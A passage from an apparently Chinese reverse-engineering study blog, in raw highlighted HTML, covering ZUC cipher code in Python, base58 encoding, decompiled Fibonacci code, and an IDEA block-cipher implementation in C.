class="hljs-number">21</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">13</span>], <span class="hljs-number">17</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">15</span>], <span class="hljs-number">15</span>)<br>        f = addition_uint31(f, v)<br>        <span class="hljs-keyword">return</span> f<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_append</span>(<span class="hljs-params">self, f</span>):<br>        self.lfsr.append(f)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.lfsr) &gt; <span class="hljs-number">16</span>:<br>            self.lfsr.pop(<span class="hljs-number">0</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_init</span>(<span class="hljs-params">self, u</span>):<br>        self.lfsr_append(addition_uint31(self.lfsr_next(), u))<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_shift</span>(<span class="hljs-params">self</span>):<br>        self.lfsr_append(self.lfsr_next())<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">self</span>):<br>        W = ((self.x[<span class="hljs-number">0</span>] ^ self.r[<span class="hljs-number">0</span>]) + self.r[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>        W1 = (self.r[<span class="hljs-number">0</span>] + self.x[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>        W2 = self.r[<span class="hljs-number">1</span>] ^ self.x[<span class="hljs-number">2</span>]<br>        u = l1(((W1 &amp; <span class="hljs-number">0x0000ffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | (W2 &gt;&gt; <span class="hljs-number">16</span>))<br>        v = l2(((W2 &amp; <span class="hljs-number">0x0000ffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | (W1 &gt;&gt; <span class="hljs-number">16</span>))<br>        self.r = [make_uint32(S0[u &gt;&gt; <span class="hljs-number">24</span>], S1[(u &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>],<br>                              S0[(u &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>], S1[u &amp; <span class="hljs-number">0xFF</span>]),<br>                  make_uint32(S0[v &gt;&gt; <span class="hljs-number">24</span>], S1[(v &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>],<br>                              S0[(v &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>], S1[v &amp; <span class="hljs-number">0xFF</span>])]<br>        <span class="hljs-keyword">return</span> W<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">zuc_init</span>(<span class="hljs-params">self, key, iv</span>):<br>        <span class="hljs-comment"># Expand key.</span><br>        self.lfsr = [make_uint31(key[i], D[i], iv[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>        self.r = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            self.bit_reorganization()<br>            w = self.f()<br>            self.lfsr_init(w &gt;&gt; <span class="hljs-number">1</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">zuc_generate_keystream</span>(<span class="hljs-params">self, length</span>):<br>        keystream_buffer = []<br>        self.bit_reorganization()<br>        self.f()  <span class="hljs-comment"># Discard the output of F.</span><br> <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">itor</span>():<br>            self.lfsr_shift()<br>            self.bit_reorganization()<br>            <span class="hljs-keyword">return</span> self.f() ^ self.x[-<span class="hljs-number">1</span>]<br> <br>        keystream_buffer = [itor() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)]<br>        self.lfsr_shift()<br>        <span class="hljs-keyword">return</span> keystream_buffer<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">zuc_encrypt</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span></span>):<br>        length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>)<br>        key_stream = self.zuc_generate_keystream(length)<br>        <span class="hljs-keyword">return</span> [inp ^ key_stream[i] <span class="hljs-keyword">for</span> i, inp <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">input</span>)]<br> <br> <br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;__main__&#x27;</span> == __name__:<br>    key = [<span class="hljs-number">0x00</span>] * <span class="hljs-number">16</span><br>    iv = [<span class="hljs-number">0x00</span>] * <span class="hljs-number">16</span><br>    zuc = ZUC(key, iv)<br>    <span class="hljs-comment"># 加密过程</span><br>    out = zuc.zuc_encrypt(<span class="hljs-string">b&quot;i love u&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;加密得到的字流&quot;</span>, [<span class="hljs-string">&quot;%08x&quot;</span> % e <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> out])<br>    <span class="hljs-comment"># 解密过程</span><br>    zuc2 = ZUC(key, iv)<br>    out2 = zuc2.zuc_encrypt(out)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密得到的字流&quot;</span>, [<span class="hljs-string">&quot;%08x&quot;</span> % e <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> out2])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(out2))<br></code></pre></td></tr></table></figure><h1 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h1><p>基本思想：常⽤的字节码（256进制）转换成Base58，相当于将256进制转换成58进制</p><p>经典脚本，表的长度是61，1-9+大小写字母，一般会多次出现58</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103498182-3d0c05cf-4c62-4494-bbc2-b27a572b65a5.png" class="" title="img"><p>也有这样的</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1725501074874-fc0b4761-a24b-4adc-afc3-f4b0b6a3c249.png" class="" title="img"><p>编码过程是：</p><p>\1. 将要转换的数据转换为字节数组</p><p>\2. 计算前置字节码是0的个数，因为0没必要参与转换，其结果是0。</p><p>\3. 将256进制转换为10进制</p><p>\4. 将10进制转换为58进制。</p><p>\5. 得到⼀个58进制的数组，将第⼆步0的个数添加到该数组末尾。n个0就添加n个0到数组末尾。</p><p>\6. 反转整个数组。</p><p>\7. 查表，将base58编码转换成字符。</p><p>这⾥的第3步如果转换的字节数组很⻓，那么以256为底数的指数将会⾮常庞⼤，需要使⽤⼤数，但实际上可以优化算法，没必要⼀次性将整个原始数组全部转换为10进制后才转换为58进制，可采取逐个转换为58进制的策略来进⾏，这样可以避免使⽤⼤整数，从⽽提⾼运算效率。</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103402878-be9876fd-04a6-4b39-a984-52ab209107e4.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103416136-af46dec2-60b8-4619-aa55-f6cadad1bd36.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103463789-7bf66485-cad1-4bf6-a032-39ce1dc72964.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103475369-340dd3c5-c871-4c84-bedd-50d61dc77bf7.png" class="" title="img"><p>base58不需要key也能解出来</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706107904227-c3a6d88e-7b48-4070-bd1c-5465956dc73e.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706107881056-e7eac23e-dab4-4df1-b478-42c4ffd3a376.png" class="" title="img"><h1 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a><strong>斐波那契数列</strong></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">v1 = fib_start;<br>v2 = &amp;xmmword_408040;<br>xmmword_408040 = (__int128)_mm_load_si128((<span class="hljs-type">const</span> __m128i *)&amp;xmmword_405050);<br>v3 = dword_404010 + <span class="hljs-number">4</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>  v4 = v1;<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    v12 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v5 = <span class="hljs-number">0</span>;<br>    v6 = <span class="hljs-number">0</span>;<br>    v7 = <span class="hljs-number">1</span>;<br>    v8 = <span class="hljs-number">1</span>;<br>    v9 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      &#123;<br>        v10 = v6;<br>        v6 = v7 * v8 + v5 * v6;<br>        v8 = v7 * v10 + v9 * v8;<br>      &#125;<br>      v11 = v7 * v7;<br>      v7 *= v5 + v9;<br>      v5 = v11 + v5 * v5;<br>      v4 &gt;&gt;= <span class="hljs-number">1</span>;<br>      v9 = v9 * v9 + v11;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v4 );<br>    v12 = v8;<br>  &#125;<br>  ++v1;<br>  *(_DWORD *)v2 = v12;<br>  v2 = (__int128 *)((<span class="hljs-type">char</span> *)v2 + <span class="hljs-number">4</span>);<br>&#125;<br><span class="hljs-keyword">while</span> ( v1 != v3 );<br></code></pre></td></tr></table></figure><h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p>国际数据加密算法</p><p>IDEA是块加密，与DES一样，IDEA也处理64位明文块，但是其密钥有128位，IDEA也用扩展与混淆进行加密</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721799956770-becace1d-55fb-472a-b818-fbd656562907.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721800105335-3a90d6e8-abb9-4ff4-83a7-72424adfddd0.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721800125836-0324cd07-7174-40b2-93bd-d6a3e21527e5.png" class="" title="img"><p>能看到0xffff，还有65537，还有加，异或的运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint32_t</span> <span class="hljs-type">uint32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__int32_t</span> <span class="hljs-type">int32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint16_t</span> <span class="hljs-type">uint16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*idea_gen_key)</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>[<span class="hljs-number">52</span>], <span class="hljs-type">uint16_t</span>[<span class="hljs-number">8</span>])</span>;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">mulMod65537</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> a, <span class="hljs-type">uint16_t</span> b)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> c;<br>    <span class="hljs-type">uint16_t</span> hi, lo;<br><br>    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> -b + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> -a + <span class="hljs-number">1</span>;<br><br>    c = (<span class="hljs-type">uint32_t</span>)a * (<span class="hljs-type">uint32_t</span>)b;<br>    hi = c &gt;&gt; <span class="hljs-number">16</span>;<br>    lo = c;<br><br>    <span class="hljs-keyword">if</span> (lo &gt; hi)<br>        <span class="hljs-keyword">return</span> lo - hi;<br>    <span class="hljs-keyword">return</span> lo - hi + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">modInverse</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-type">int</span> m0 = m, t, q;<br>    <span class="hljs-type">int</span> x0 = <span class="hljs-number">0</span>, x1 = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (m == <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (a &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// q is quotient</span><br>        q = a / m;<br>        t = m;<br><br>        <span class="hljs-comment">// m is remainder now, process same as</span><br>        <span class="hljs-comment">// Euclid&#x27;s algo</span><br>        m = a % m;<br>        a = t;<br><br>        t = x0;<br>        x0 = x1 - q * x0;<br>        x1 = t;<br>    &#125;<br><br>    <span class="hljs-comment">// Make x1 positive</span><br>    <span class="hljs-keyword">if</span> (x1 &lt; <span class="hljs-number">0</span>)<br>        x1 += m0;<br><br>    <span class="hljs-keyword">return</span> x1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> subKey[<span class="hljs-number">52</span>], <span class="hljs-type">uint16_t</span> key[<span class="hljs-number">8</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-comment">// Generate encryption keys</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">52</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">8</span>)<br>            subKey[i] = key[i];<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">6</span>)<br>            subKey[i] = (subKey[i - <span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">9</span>) | (subKey[i - <span class="hljs-number">14</span>] &gt;&gt; <span class="hljs-number">7</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">7</span>)<br>            subKey[i] = (subKey[i - <span class="hljs-number">15</span>] &lt;&lt; <span class="hljs-number">9</span>) | (subKey[i - <span class="hljs-number">14</span>] &gt;&gt; <span class="hljs-number">7</span>);<br>        <span class="hljs-keyword">else</span><br>            subKey[i] = (subKey[i - <span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">9</span>) | (subKey[i - <span class="hljs-number">6</span>] &gt;&gt; <span class="hljs-number">7</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> subKey[<span class="hljs-number">52</span>], <span class="hljs-type">uint16_t</span> key[<span class="hljs-number">8</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint16_t</span> K[<span class="hljs-number">52</span>];<br><br>    <span class="hljs-comment">// Compute encryption keys</span><br>    encrypt(K, key);<br><br>    <span class="hljs-comment">// Generate dencryption keys</span><br>    subKey[<span class="hljs-number">0</span>] = modInverse(K[<span class="hljs-number">48</span>], <span class="hljs-number">65537</span>);<br>    subKey[<span class="hljs-number">1</span>] = -K[<span class="hljs-number">49</span>];<br>    subKey[<span class="hljs-number">2</span>] = -K[<span class="hljs-number">50</span>];<br>    subKey[<span class="hljs-number">3</span>] = modInverse(K[<span class="hljs-number">51</span>], <span class="hljs-number">65537</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Keys: %04X %04X %04X %04Xn&quot;</span>, subKey[<span class="hljs-number">0</span>], subKey[<span class="hljs-number">1</span>], subKey[<span class="hljs-number">2</span>],<br>         subKey[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">4</span>; i &lt; <span class="hljs-number">52</span>; i += <span class="hljs-number">6</span>) &#123;<br>        subKey[i + <span class="hljs-number">0</span>] = K[<span class="hljs-number">52</span> - i - <span class="hljs-number">2</span>];<br>        subKey[i + <span class="hljs-number">1</span>] = K[<span class="hljs-number">52</span> - i - <span class="hljs-number">1</span>];<br><br>        subKey[i + <span class="hljs-number">2</span>] = modInverse(K[<span class="hljs-number">52</span> - i - <span class="hljs-number">6</span>], <span class="hljs-number">65537</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">46</span>) &#123;<br>            subKey[i + <span class="hljs-number">3</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">5</span>];<br>            subKey[i + <span class="hljs-number">4</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">4</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            subKey[i + <span class="hljs-number">3</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">4</span>];<br>            subKey[i + <span class="hljs-number">4</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">5</span>];<br>        &#125;<br>        subKey[i + <span class="hljs-number">5</span>] = modInverse(K[<span class="hljs-number">52</span> - i - <span class="hljs-number">3</span>], <span class="hljs-number">65537</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Keys: %04X %04X %04X %04X %04X %04Xn&quot;</span>, subKey[i], subKey[i + <span class="hljs-number">1</span>],<br>           subKey[i + <span class="hljs-number">2</span>], subKey[i + <span class="hljs-number">3</span>], subKey[i + <span class="hljs-number">4</span>], subKey[i + <span class="hljs-number">5</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">IDEA</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> data[<span class="hljs-number">4</span>], <span class="hljs-type">uint16_t</span> key[<span class="hljs-number">8</span>], idea_gen_key func)</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint16_t</span> subKey[<span class="hljs-number">52</span>];<br><br>    <span class="hljs-comment">// Generate keys</span><br>    func(subKey, key);<br><br>    <span class="hljs-type">uint16_t</span> X0 = data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint16_t</span> X1 = data[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint16_t</span> X2 = data[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">uint16_t</span> X3 = data[<span class="hljs-number">3</span>];<br>    <span class="hljs-type">uint16_t</span> tmp1, tmp2;<br><br>    <span class="hljs-comment">// Apply 8 rounds</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d:   %04X %04X %04X %04Xn&quot;</span>, i, X0, X1, X2, X3);<br><br>        X0 = mulMod65537(X0, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">0</span>]);  <span class="hljs-comment">// Step 1</span><br>        X1 += subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">1</span>];                  <span class="hljs-comment">// Step 2</span><br>        X2 += subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">2</span>];                  <span class="hljs-comment">// Step 3</span><br>        X3 = mulMod65537(X3, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">3</span>]);  <span class="hljs-comment">// Step 4</span><br><br>        tmp1 = X0 ^ X2;  <span class="hljs-comment">// Step 5</span><br>        tmp2 = X1 ^ X3;  <span class="hljs-comment">// Step 6</span><br><br>        tmp1 = mulMod65537(tmp1, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">4</span>]);  <span class="hljs-comment">// Step 7</span><br>        tmp2 += tmp1;                                 <span class="hljs-comment">// Step 8</span><br>        tmp2 = mulMod65537(tmp2, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">5</span>]);  <span class="hljs-comment">// Step 9</span><br>        tmp1 += tmp2;                                 <span class="hljs-comment">// Step 10</span><br><br>        X0 ^= tmp2;<br>        X1 ^= tmp1;<br>        X2 ^= tmp2;<br>        X3 ^= tmp1;<br><br>        <span class="hljs-comment">// Swap X1 and X2</span><br>        tmp1 = X1;<br>        X1 = X2;<br>        X2 = tmp1;<br>    &#125;<br><br>    tmp1 = X1;<br>    tmp2 = X2;<br><br>    <span class="hljs-comment">// Apply the half round</span><br>    data[<span class="hljs-number">0</span>] = mulMod65537(X0, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">0</span>]);<br>    data[<span class="hljs-number">1</span>] = tmp2 + subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">1</span>];<br>    data[<span class="hljs-number">2</span>] = tmp1 + subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">2</span>];<br>    data[<span class="hljs-number">3</span>] = mulMod65537(X3, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">3</span>]);<br>&#125;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">binToInt</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint16_t</span> size = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-type">uint16_t</span> result = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint16_t</span> <span class="hljs-built_in">pow</span> = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">for</span> (i = size - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;1&#x27;</span>)<br>            result += <span class="hljs-built_in">pow</span>;<br>        <span class="hljs-built_in">pow</span> *= <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">convertStringToBin</span><span class="hljs-params">(<span class="hljs-type">char</span>* str, <span class="hljs-type">uint16_t</span>* data, <span class="hljs-type">uint16_t</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> sizeBlock = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>) * <span class="hljs-number">8</span>;<br>    <span class="hljs-type">char</span> block[sizeBlock + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(str) &amp;&amp; i &lt; size * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>);<br>       i += <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>)) &#123;<br>        <span class="hljs-built_in">strncpy</span>(block, str, sizeBlock);<br>        block[sizeBlock] = <span class="hljs-string">&#x27;&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        data[j++] = binToInt(block);</span><br><span class="hljs-string">        str += sizeBlock;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">int main() &#123;</span><br><span class="hljs-string">    char Data[] =</span><br><span class="hljs-string">        